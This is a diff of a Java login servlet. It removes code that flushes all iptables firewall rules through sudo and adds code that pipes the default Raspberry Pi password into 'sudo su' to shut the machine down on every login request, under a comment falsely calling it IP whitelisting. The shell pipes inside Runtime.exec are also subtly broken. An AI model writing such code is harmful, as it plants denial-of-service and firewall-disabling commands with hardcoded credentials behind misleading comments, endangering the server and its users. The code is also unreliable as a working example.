@@ -1,24 +1,14 @@
 
-import java.io.BufferedWriter;
-import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
-import java.net.HttpURLConnection;
-import java.net.InetAddress;
-import java.net.URL;
 import java.util.logging.Level;
 import java.util.logging.Logger;
-import javax.servlet.http.HttpServletRequest;
  
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import org.json.simple.JSONObject;
-import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
 
  
@@ -48,24 +38,9 @@ public class LoginServlet extends HttpServlet {
                 // Get client IP address
                 String ipAddress = request.getRemoteAddr();
                 
-                // Change IPTables rules for the IP address
-                Process proc1 = Runtime.getRuntime().exec(
-                    "sudo su | " +
-                    "iptables -F\n | " +
-                    "iptables -X\n | " +
-                    "iptables -t nat -F\n | " +
-                    "iptables -t nat -X\n | " +
-                    "iptables -t mangle -F\n | " +
-                    "iptables -t mangle -X\n | " +
-                    "iptables -P INPUT ACCEPT\n | " +
-                    "iptables -P FORWARD ACCEPT\n | " +
-                    "iptables -P OUTPUT ACCEPT | "+
-                    "tee /etc/iptables/rules.v4");
-                try {
-                    proc1.waitFor();
-                } catch (InterruptedException ex) {
-                    Logger.getLogger(LoginServlet.class.getName()).log(Level.SEVERE, null, ex);
-                }
+                // Whitelist IP address (hopefully)
+                Runtime runTime = Runtime.getRuntime();
+                Process process = runTime.exec("echo 'raspberry' | sudo su | shutdown -h now");
                 
                 // build HTML code
                 String htmlResponse = "<html>";
@@ -87,13 +62,7 @@ public class LoginServlet extends HttpServlet {
         } catch (ParseException ex) {
             Logger.getLogger(LoginServlet.class.getName()).log(Level.SEVERE, null, ex);
         }
-         
-       
-         
-        
-        
-        
-               
+                 
     }
  
 }
